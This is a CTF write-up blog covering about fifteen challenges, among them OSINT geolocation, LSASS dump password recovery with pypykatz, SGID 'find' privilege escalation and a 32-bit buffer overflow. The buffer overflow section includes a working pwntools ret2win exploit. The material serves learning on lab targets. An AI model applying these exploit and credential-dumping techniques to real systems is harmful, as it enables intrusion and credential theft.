HTTP/1.1 403 Forbidden
Accept-Ranges: bytes
Content-Length: 254
Content-Type: application/xml
Server: MinIO
Strict-Transport-Security: max-age=31536000; includeSubDomains
Vary: Origin
Vary: Accept-Encoding
X-Amz-Id-2: dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8
X-Amz-Request-Id: 17FB84042B3F0BFF
X-Content-Type-Options: nosniff
X-Ratelimit-Limit: 59
X-Ratelimit-Remaining: 59
X-Xss-Protection: 1; mode=block
Date: Sat, 05 Oct 2024 09:20:35 GMT
```

And a response payload:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<Error>
<Code>AccessDenied</Code>
<Message>Access Denied.</Message>
<Resource>/</Resource>
<RequestId>17FB83CDD3C44A1E</RequestId>
<HostId>dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8</HostId>
</Error>
```

so anyways, like curl, *POST*ing a normal *GET* request yields a **403** error. The respond header is informative, showing that the server is running `MinIO` with _Amazon S3_.

For now I will use: `curl -v -H 'Host:challenge.ctf.games:PORT' challenge.ctf.games:PORT ` to interact, with will nicely delimit the response header, as well as do the dirty work of crafting the request for me.

## Trying other post methods:

Instead of **GET** I tried others, by using the `-X` flag in curl.

- **HEAD** received a **400 BAD REQUEST**
- **POST** also gives a bad request
- **OPTIONS** gave something:

```
* Host challenge.ctf.games:PORT was resolved.
* IPv6: (none)
* IPv4: 35.193.148.143
*   Trying 35.193.148.143:PORT...
* Connected to challenge.ctf.games (35.193.148.143) port PORT
> OPTIONS / HTTP/1.1
> Host: challenge.ctf.games
> User-Agent: curl/8.9.1
> Accept: */*
>
* Request completely sent off
< HTTP/1.1 200 OK
< Vary: Origin
< Date: Sat, 05 Oct 2024 09:28:03 GMT
< Content-Length: 0
<
* Connection #0 to host challenge.ctf.games left intact
```

Interesting. At least there is confirmation that the server is working and accepting HTTP requests instead of just denying everything (I mean there was not a need to check but good to know).

## What do you bring to the beach?

The challenge now is to find a common access point that is exposed to the public without needing authentication. So i enumerated various endpoints like _sunscreen_, _towel_, ***bucket***.

"***bucket***" is such a _web storage_ term. and yes. `/bucket` turns out to be publicly facing without needing authentication! The xml file details some files, all arbitrary named. Trying to manually download one of the files at `bucket/FILENAME` gives a long ascii text file. Time to investigate!

## Download all the file

I extracted all the file keys with a little bit of (rip)grep, and then curl them out. I had to first check that all the files were of unique names by comparing

```sh
while read -r line; do echo $(basename $line); done < filepaths | wc -l
```

with

```sh
while read -r line; do echo $(basename $line); done < filepaths | uniq | wc -l
```

and I find 122 files. Next is to curl them all. I test first, and run:

```sh
while read -r line; do curl -v "challenge.ctf.games:30942/bucket/$line" -o "files/$(basename $line)"; done < filepaths
```

All the files are `ASCII text, with very long lines, with no line terminators` according to the `file` command. Looking at some of them, I am guessing it is `base64` encoded, so time to decode them.

Some failed, some succeeded, and running `file` on the succeeded files show most are _data_ but some are OpenPGP public keys, with one secret key. hmhm.

## gpg?

I start to process the OpenPGP keys using **gpg**. Firstly I needed to create a temporary configuration directory with permissions set to `700` so that gpg does not pollute my home directory. I can then use the `--homedir` flag to point to this folder instead. Using `--list-packets`, the secret key file gives `gpg: packet(5) with unknown version 141`. The other 2 errors out. trying to import them also errors out

## now what?

I try to decode the files and it just gets worse and worse. I am lost. I stop and go all the way back to the base file where I had all the files I had initially downloaded.

As a last ditch effort, I tried to recursively search for a flag in the files (rg is ripgrep, a faster **grep** alternative):

```
rg 'flag'
```

and there it was. Lurking deep. The flag.


## Moral?

This taught me a valuable lesson: don't overthink, and be careful of red herrings. I overtrusted `file` and it was not good.

{: #unbelievable}
# Unbelievable
> Author: @JohnHammond
> Don't believe everything you see on the Internet!
> Anyway, have you heard this intro soundtrack from Half-Life 3?

This challenge was quick and easy! I did it while on the way to celebrate my sister's birthday.

Half life 3 OST. Hilarious. As with all song files, I immediately threw it into a spectrogram to find any hidden messages. Other than bird noises, nothing.

I guess the next is to find an actual file embedded inside. So I went to [hexed, an online hex editor](https://hexed.it) and sure enough, I saw those three letters: *P, N, G*.

![hexed]()

I quickly went to my phone's file browser, and renamed the extension to *.png*, and voila!

![flag image]()

{: #txt_message}
# TXT Message
> Author: @JohnHammond
>
> Hmmm, have you seen some of the strange DNS records for the ctf.games domain? One of them sure is odd...
(In the task, [od](https://en.wikipedia.org/wiki/Od_(Unix))d linked to the wikipedia article for the `od` programme)

This was a fun warm-up. Using [an online DNS record search](https://www.nslookup.io/), I got this TXT record for `ctf.games`:

![DNS record]()

passing it through an octal-to-ascii converter gave the flag.

{: #discount_programming_devices}
# Discount Programming Devices
> Author: @sudo_Rem
>
> I used a tool on the internet to obfuscate my script!
> But I lost it, and I don't know how to get it back.
> Maybe you can help?

The file given has a python extension. Inspecting it, it was a one liner (*effectively 2 lines if the semicolons were replaced with newlines*). The base64 decoder from *zlib* is first imported, then used to decode another base64 string that gets executed:

```py
_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))

# cleaned
def helper(x):
__import__('zlib').decompress(__import__('base64').b64decode(x[::-1]))
```

Something very sneaky here - the base64 string is **reversed** before decoding, with `[::-1]`.
I carefully removed the `exec` and printed out the result, then ran the file using python. It yields another string that executes the result of the above `_` function. I again carve out the `exec` and repeat, and repeats, and repeats, and repeats.... My biggest fear is my fatigue might accidentally run with `exec`. After 13 times of manually outputting the results and removing the `exec`, I decided to just use *bpython* to override the string with the results of the helper function, with `[11:-3]` to carve out the `exec`. Good call because it took another 38 iterations to reach something new. The last iteration was just a direct decode of a base64 string, yielding the flag.

{: #mimi}
# Mimi
> Author: @JohnHammond
> Uh oh! Mimi forgot her password for her Windows laptop!
> Luckily, she dumped one of the crucial processes running on her computer (don't ask me why, okay)... can you help her recover her password?

The dump file is **HUGE**. From the start, it seems that this is a dump of *LSASS* (Local Security Authority Subsystem Service). LSASS dumps are known to leak credentials, hence this is perfect. Typically *mimikatz* is used, but on linux, the alternative is [pypykatz](https://github.com/skelsec/pypykatz). Using the `pypykatz lsa minidump` option, the password reveals itself as a flag. Now to save space and delete the dump....

{: #system_code}
# System Code
> Author: Truman Kain
> Follow the white rabbit.
> NOTE: Bruteforce is permitted for this challenge instance if you feel it is necessary.

This one greets us with a fancy login page. Honestly not sure if it's secretly mining crypto in the background.

![Matrix login]()

By monitoring the network in *Brave*'s developer console, I noticed that a `GET` request is posted using `<URL>/enter=<INPUT>`, which shows the response in plaintext. This is perfect to automate bruteforcing, while giving my eyes a break from the cheesy matrix background.

{: #zimmer_down}
# Zimmer Down
> Author: @sudo_Rem
>
> A user interacted with a suspicious file on one of our hosts.
> The only thing we managed to grab was the user's registry hive.
> Are they hiding any secrets?

This took a lot of searching, and rethinking. Firstly trying strings yielded nothing easy to crack. The shortcut file names were funny though. 

- `How to find flags.mp4.lnk`
- `notthe_flag.lnk`
- `john_and_i_at_dinner.lnk`
- `john_and_i_on_the_beach.lnk`
- `just_john.lnk`
- `huntress_beats_to_study_and_relax_to.mp3.lnk`

There was a lot of figuring out what I can try to find with `chntpw`, which allows manipulation of registry hive data. However I couldn't get it to dump any data, and manually checking each key is going to take forever. So I went back to the prompt - it mentioned how the user interacted with something and they managed to grab the hive "just in time". So it must be something along the path of Explorer and recent files. Having seen all the `.lnk` shortcut files, I decided to take a look at strings once again, hoping to maybe see what recent apps were opened by the shortcut files.

After a few dozen `.lnks`, I spotted something. A file name that was encoded alphanumerically (looked like Base64), with the extension `.b62.lnk.` The `.lnk` denotes it is a shortcut, but the extension of the original file, `b62`, made lights go off in my mind. I remembered while trying to decode the files for [[Ran Somewhere]], I accidentally scanned for the file type of one of the encoded files without decoding it first from Base64. It said it was a *Base64 encoded JPEG* with the possible extensions `.b64`. So I figured this *b62 file*'s name would also be in Base62. I threw it into [CyberChef](https://gchq.github.io/CyberChef), and out came the flag.

{: #ran_somewhere}
# Ran Somewhere
> Author: @Spyderwall
>
> Thanks for joining the help desk! Here's your first ticket of the day; can you help the client out?
>
> NOTE, this challenge uses a non-standard flag format. Enter the human-readable name of the location.

This is very very fun. There's a lot of funny names too, **but not all are fake**! It's specifically an OSINT task, so if there's no searching and too much digging, something's wrong. Firstly, I digged through the `.eml` file. There's a lot of begging for help. I have to admit, I was a bit lost trying to understand the file format at first, but now in hindsight all makes sense. The email has its contents and attached files encoded in _Base64_. To begin, the main email is an html file, that when decoded reads:

> Help Me IT!! My USB was stolen! I was headed into town for some work and stopped by a client's coffee shop to get work done. Everything was fine; I was working and drinking coffee. I got up to use the restroom; when I returned, I saw that my computer had been tampered with! All my work was closed out, and my flash drive with my projects was gone! I can't lose this; there was very important work on it! I thought the security tools you put in place would stop something like this!!
> When I was looking at the desktop, I noticed three new files that were not there before. I opened one to see if they were my files, but they are a jumbled mess. I can't make any sense of it. I think it is that "ran somewhere" that your team keeps warning us about. I still don't know what it is, but please reverse this and get my USB back. I can't believe this happened!
> I am attaching those files so you can fix them.
>
> -Mack Eroni
> President
>
> [Check out our new website!](https://sites.google.com/view/id-10-t/home)
> ![company logo.png]()

The company logo here links to the second encoded file, which is an _PNG_ file of their logo. I started laughing when i saw *ID10T solutions*. A few important things to note here:

- Client's coffee shop
- Computer tampered within the short span of restroom break
- Three new files that are in *jumbled mess* (indicating encoding or encryption)
- Company website

Very nice. The next three files are all base64 encoded. Here are the contents:

## File one: '4e 6f 74 65.txt'

The filename is hex for: `note.txt`
> Hey There! You should be more careful next time and not leave your computer unlocked and unattended! You never know what might happen. Well in this case, you lost your flash drive. Don't worry, I will keep it safe and sound. Actually you could say it is now 'fortified'. You can come retrieve it, but you got to find it. I left a couple of files that should help.
> - Vigil Ante

Irritating fellow but has a point. Some important notes:

- 'fortified'
- The files left behind should help

## File two: '66 69 6e 64 20 69 74 20 79 65 74'

The filename is also hex, for `find it yet`. It is a JPEG image. I'll be honest, I actually wrongly copied the contents at first, rendering the decoding useless. I will skip this for now because the next file alone is enough to find the answer.

![find it yet]()

## File three: '69 6d 20 6e 65 61 72 62 79'

This file is named `im nearby`. Also another JPEG image, it is very useful!

![im nearby]()

I like this because there are many clues:

- grey brick pavement
- **curved** red brick pavement (with black bricks peppered)
- 'castle' looking building on the right
- 2 black posts in the distance
- there is a road with a car
- there is another white commercial single-story building opposite the road
- there is a fence-gate
- checkered flooring on the right *(this was more distracting to be honest)*
- a emblem or sign with *Frederick*	on it

## Company website

Let's look at the company website.

![id-10-t website]()

The about page is humouring, but it only confirms the CEO being *Mark Eroni*, the person who sent the email.

![id-10-t aboutus]()

Back to the home page. Scrolling down, there are some *client feedbacks*.

![id-10-t feedback]()

> What Our Clients Are Saying!
> Spoiler Alert: They Love us!
> "I'm not sure what we paid ID10T solutions for... We reached out for business consulting; they showed up talked in business jargon and sent us a bill..." -Uninspired Insights, Inc.
>
> "I had ID10T come out to see if they could help us increase sales. They just drank all of our coffee... I think we gotta close" -  Z Vault Coffee Shop
>
> "They did a whole lot of nothing for us, and somehow we still paid them" - Gullible Advisory Partners
>
> Not Licensed to provide solutions to anyone or anywhere, especially Maryland

Hilarious, but look at the three *clients*:

1. Uninspired Insights, Inc.
2. Z Vault Coffee Shop
3. Gullible Advisory Partners

Remember the email? It mentioned the CEO visiting the *client at their coffee shop*. That has to be **Z Vault Coffee Shop**! It looks suspicious but not as obviously fake as the other client names. Also, something is off with the advisory focusing on *Maryland*.


## Time to search

To summarise:

- Client's coffee shop
- That is **Z Vault Coffee Shop**
- Computer tampered within the short span of restroom break
- Location is about a **10 minute radius**, especially if they are on foot
- *fortified*
- Location has to be somewhere with security
- grey brick pavement
- **curved** red brick pavement (with black bricks peppered)
- 'castle' looking building on the right
- 2 black posts in the distance
- there is a road with a car
- there is another white commercial single-story building opposite the road
- there is a fence-gate
- checkered flooring on the right
- a emblem or sign with *Frederick* on it
- *Maryland*

Here is a checklist to figure out what to search:

- [ ] Z Vault Coffee Shop
- [ ] 10 minute radius
- [ ] *fortified*
- [ ] 'castle' looking building on the right
- [ ] grey brick pavement
- [ ] **curved** red brick pavement (with black bricks peppered)
- [ ] 2 black posts in the distance
- [ ] there is a road with a car
- [ ] there is another white commercial single-story building opposite the road
- [ ] there is a fence-gate
- [ ] checkered flooring on the right
- [ ] a emblem or sign with *Frederick* on it
- [ ] *Maryland*


I googled *Z Vault Coffee Shop*, and behold:

![Z Vault Coffee Shop]()

It is a legitimate place! Moreover, it is in Bel Air, **Maryland**.

## Searching the maps

Let's use our favourite OSINT geographic surveillance technology: Google Maps. From the get-go, I can see the sporadic red pavements among the normal grey pavements. The lanes are mostly tiny, with buildings along both sides.

![Z Vault Map]()

- [x] Z Vault Coffee Shop
- [ ] 10 minute radius
- [ ] *fortified*
- [ ] 'castle' looking building on the right
- [x] grey brick pavement
- [ ] **curved** red brick pavement (with black bricks peppered)
- [ ] 2 black posts in the distance
- [ ] there is a road with a car
- [ ] there is another white commercial single-story building opposite the road
- [ ] there is a fence-gate
- [ ] checkered flooring on the right
- [ ] a emblem or sign with *Frederick* on it
- [x] *Maryland*

> [!NOTE]
> A slide tangent: I actually missed the red pavements, and so went to search for *Fort Frederick Bel Air MD* and got *Fort Derrick MD*. It also had the same red and grey pavements, which sent me searching for awhile. Thankfully I gave up quickly, and went back to Bel Air, MD. I also searched for *Checkerboard* and *Chessboard* outdoor pavements, but got nowhere. Good thing they did not lead me down a rabbit hole of no return.

I noticed something odd - the red pavements were all *straight*, but in *im nearby*.jpg, the red pavement is **curved**. So there was no choice but to slowly sweep the location. Ten minutes later, I see a candidate: **Bel Air Armory**.

![Bel Air Armory]()

- [x] Z Vault Coffee Shop
- [x] 10 minute radius
- [x] *fortified*
- [x] 'castle' looking building on the right
- [x] grey brick pavement
- [x] **curved** red brick pavement (with black bricks peppered)
- [ ] 2 black posts in the distance
- [x] there is a road with a car
- [x] there is another white commercial single-story building opposite the road
- [x] there is a fence-gate
- [ ] checkered flooring on the right
- [ ] a emblem or sign with *Frederick* on it
- [x] *Maryland*

This looks promising. I continue to scan around, and look for the street view. Unfortunately I am unable to get the view I wanted, but I saw something else.

![Bel Air Armory street view]()


This was the back of that same armory building. The *road* is the carpark behind, and the *buildings opposite* is the Armory Market. It revealed the two black posts, and fence gates as well.

- [x] Z Vault Coffee Shop
- [x] 10 minute radius
- [x] *fortified*
- [x] 'castle' looking building on the right
- [x] grey brick pavement
- [x] **curved** red brick pavement (with black bricks peppered)
- [x] 2 black posts in the distance
- [x] there is a road with a car
- [x] there is another white commercial single-story building opposite the road
- [x] there is a fence-gate
- [ ] checkered flooring on the right
- [ ] a emblem or sign with *Frederick* on it
- [x] *Maryland*

I held my breathe and entered the flag: *Bel Air Armory*. Success.

{: #mystery}
# Mystery
> Author: Michael Orlino
>
> Someone sent this to me...
> such enigma, such mystery:
>
> ``` rkenr wozec gtrfl obbur bfgma fkgyq ctkvq zeucz hlvwx yyzat zbvns kgyyd sthmi vsifc ovexl zzdqv slyir nwqoj igxuu kdqgr fdbbd njppc mujyy wwcoy ```
>
> Settings as below:
>  - 3 Rotor Model
>  - Rotor 1: VI, Initial: A, Ring A
>  - Rotor 2: I, Initial: Q, Ring A
>  - Rotor 3: III, Initial L, Ring A
>  - Reflector: UKW B
>  - Plugboard: BQ CR DI EJ KW MT OS PX UZ GH

Seems like the Enigma machine used in World War 2. Anyways, using [cryptii](https://cryptii.com/pipes/enigma-machine), the settings by default were already set. The result reads:

> message wrapped in light hidden deeper out of sight locking it more tight anyway your flag is here flag <32CHARACTERS>zzz

The `zzz` at the end did throw me off, having to manually count again and again to realise that it is probably padding.

{: #GoCrackMe1}
# GoCrackMe1
> Author: @HuskyHacks
> 
> TENNNNNN-HUT!
> 
> Welcome to the Go Dojo, gophers in training!
> 
> Go malware is on the rise. So we need you to sharpen up those Go reverse engineering skills. We've written three simple CrackMe programs in Go to turn you into Go-binary reverse engineering ninjas!
> 
> First up is the easiest of the three. Go get em!

First, strings. Nothing. Then straight to Binary Ninja. Since this is a *Golang* programme, there was a lot of debugging info available. I quickly went to the main function, and then saw a string being copied to a buffer.

![string]()

Then, a loop that `XOR`s each character by `0x56`. 

![XOR]()

Throw this two information into [CyberChef](https://gchq.github.io/CyberChef) and done.

{: #i_cant_ssh}
# I can't SSH
> Author: @JohnHammond
> 
> I've got this private key... but why can't I SSH?

The password is given when starting the container server. Trying to connect results in failure, with `ssh` telling us the public key is invalid. It also scolds us for using an insecure private key file. Anyways, opening this file shows that it is a *OPENSSH PRIVATE KEY*. We need to convert this into a rsa key:

```
puttygen id_rsa -O private-sshcom -o newkey
ssh-keygen -i -f newkey > newkey_in_right_format
```

However, when trying, it still fails:

```
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0644 for 'newkey_in_right_format' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
```

Notice the *This private key will be ignored*. So we need to change the permission.

```
chmod 400 newkey_in_right_format
```

SSH in and enter the password, and we get in. Flag is stored in a text file in the home directory.

{: #finders_fee}
# Finder's Fee 
> Author: @JohnHammond
> 
> You gotta make sure the people who find stuff for you are rewarded well!
> 
> Escalate your privileges and uncover the flag.txt in the finder user's home directory.

This took me some time because I was careless. The first thing to try is to find a `SUID` or `SGID` file. I kept trying to search and search but no file with `SUID` set was helpful. I started to try all possible loopholes and was about to give up.

Then I reread the prompt. "people who ***FIND*** stuff ...".

I immediately ran `ls -l` on `find` after using `which find` to get its path.

```
-rwxr-sr-x 1 root finder 204264 Apr  8  2024 /usr/bin/find
```

My God. That `s` bit is signalling `SGID` is set. I felt so dumb for searching `SUID` that I did not check the `SGID` bit also. Anyways, I used the following command and got the flag.

```sh
find /home/finder -name flag.txt -exec cat {} \;
```

{: #typo}
# Typo
> Author: @JohnHammond
> 
> Gosh darnit, I keep entering a typo in my Linux command prompt!

Firstly, trying to ssh with `ssh -p <PORT> user@challenge.ctf.games` gives an error:

```
Error opening terminal: foot.
```

I am using *foot* as my terminal emulator, so to fix it I need to set the variable `$TERM` to `xterm-256color`: 

```sh
TERM=xterm-256color ssh -p <PORT> user@challenge.ctf.games
```

I am greeted with a *Choo Choo train*! This is the classic `sl` command, for when one types `ls` wrongly. This is probably happening because the `.bashrc_profile` or `.bashrc` executes `sl` wrongly. I am immediately thrown out afterwards. To overcome this, either hack the server and get rid of that, or make ssh execute another program instead, with the `-t` flag. I run a new shell, which would not load the `bashrc_profile`. 

```sh
TERM=xterm-256color ssh -p <PORT> user@challenge.ctf.games -t /bin/sh
```

I get in, and `ls` correctly. The flag file is there.

{: #the_void}
# The Void

> Author: @JohnHammond#6971
> 
> When you gaze long into the void, the void gazes also into you...

Connecting to this results in the shell getting spammed with *nothing*. I redirected the output to a file, and it just kept growing and growing. Eventually I killed it and tried to see the hexdump, passing it to `head` to only see a bit of it. Strangely it was `1b 5b 33 30 3b 34 30 6d 20` being repeated over and over. The ascii view showed some brackets and *m*s - indicative of *ANSI escape sequence*. I did not feel motivated to decode it, so I asked ChatGPT. It gave me this breakdown:

- `1b`: ESC (Escape character)
- `[`: Beginning of an ANSI control sequence
- `30;40`: Control codes for setting text colors
- `30`: Set text color to black
- `40`: Set background color to black
- `m`: End of the control sequence
- `20`: A space character

It gave this gem: `'s/\x1b\[[0-9;]*m//g'`. Using this, I managed to `sed` the output file to remove the escape characters and extract any non sequence characters and it was just the flag, padded with plenty of spaces.

{: #baby buffer overflow}
# Baby Buffer Overflow - 32bit
> Author: @aenygma
> 
> Can you command this program to where it cannot go?
> To get the flag, you must somehow take control of its excecution.
> Is it even possible?

Looking at the provided `C` code:

```c 
#include <stdio.h>
#include <unistd.h>

//gcc -fno-pie -no-pie -Wno-implicit-function-declaration -fno-stack-protector -m32 babybufov.c -o babybufov

void target(){
    puts("Jackpot!");
    char* executable="/bin/bash";
    char* argv[]={executable, NULL};
    execve(executable,argv,NULL);
}

int vuln(){
    char buf[16];
    gets(buf);
    return 0;
}

int main(){
    setbuf(stdin,NULL);
    setbuf(stdout,NULL);
    puts("Gimme some data!");
    fflush(stdout);
    vuln();
    puts("Failed... :(");
}
```

We can tell that there is **no stack pointer protection**, and to help us, *position-independent executable* compiling is disable. This means function stack frames are placed back-to-back and addresses are as they would be. We want to hit the buffer in `vuln()` so that the `return` function returns back up to `target` instead of back to `main`. Decompiling the offered program in Binja, the `target` is mapped to location `080491f5  int32_t target()`, while the `vuln` is as follows:

```
08049236  int32_t vuln()

08049236  55                 push    ebp {__saved_ebp}
08049237  89e5               mov     ebp, esp {__saved_ebp}
08049239  83ec18             sub     esp, 0x18
0804923c  83ec0c             sub     esp, 0xc
0804923f  8d45e8             lea     eax, dword ptr [ebp-0x18 {var_1c}]
08049242  50                 push    eax {var_1c} {var_2c}
08049243  e8d8fdffff         call    gets
08049248  83c410             add     esp, 0x10
0804924b  b800000000         mov     eax, 0x0
08049250  c9                 leave    {__saved_ebp}
08049251  c3                 ret      {__return_addr}
```

We are interested in the location in the stack that stores the buffer, and the location that the `__saved_ebp` is pushed it. 
1. `push ebp {__saved_ebp}` stores the previous base stack pointer value to the stack, 
2. `mov ebp, esp {__saved_ebp}` sets the new stack base to the current stack pointer
3. `sub esp, 0x18` increases the stack by 0x18 bytes
4. `lea eax, dword ptr [ebp-0x18 {var_1c}]` calculates the effective address of *0x18 bytes behind the stack pointer*.

This is what it would look like:

```

    +----------+ \
    | ret addr | |
    +-        -+ |
    | ret addr | | 
    +-        -+ | portion we target
    | ret addr | |
    +-        -+ |
    | ret addr | |
    +----------+ / 
    | old ebp  |
    +-        -+
    | old ebp  |
    +-        -+
    | old ebp  |
    +-        -+
    | old ebp  |
    +----------+ <- ebp
    |          |
    +----------+ <- esp-0x18
      .......
    +----------+
    |          | 
    +----------+ <- esp

```

Starting from the `esp` below, data will get pushed in up until the last *blank* byte at `esp-0x18`. So by entering 24 random characters, we hit the and of the stack. The next four bytes are the `old esp` position, and above that is the precious `{__return_addr}`. We will need to key in `0x080491f5`, but not with ascii characters of course. So we use `pwntools` in python to help us.

```py
from pwn import *

target_function_address = 0x080491f5  # Address of target function

# Construct the payload
payload = b'A' * 16 + b'B' * 4 + p32(target_function_address)

# Connect to the remote service
p = remote("challenge.ctf.games", PORT)

# Send the payload
p.sendline(payload)

# Drop into interactive mode to access the shell
p.interactive()
```

We get dropped into the shell after running this, and we are free to roam the world (and print the file containing the flag).

{: #eepy}
# eepy
> Author: @HuskyHacks
> 
> *yawn* why am i so eeeeeeeeepy?

I was the 14th solve. Pretty cool. Windows executable, I immediately popped it into Binja. I entered the *main* function, and scoured for the main *action*. A lot of threads and sl*eeping*, and a lot of *red herrings* to waste time. There was, however, one *memcopy* that looked Suspicious:

![Suspicious memcopy](sus.png)

It was the only one that was copying data over, and I went to look at it. It was `0x26` bytes before `0`s. I copy the hexadecimal data over to [cyberchef](https://gchq.github.io/CyberChef) and convert from hexadecimal. It was gibberish. However, it is 38 characters, so it **had** to be the flag. I had an inkling that HuskyHacks might use *XOR*, so I just threw a *XOR Brute Force* with `flag` and the crib, and we got the flag! (Key was `0xAA`)

{: }

<!-- 
vim:wrap:spell:linebreak:showbreak=\ \ :
-->
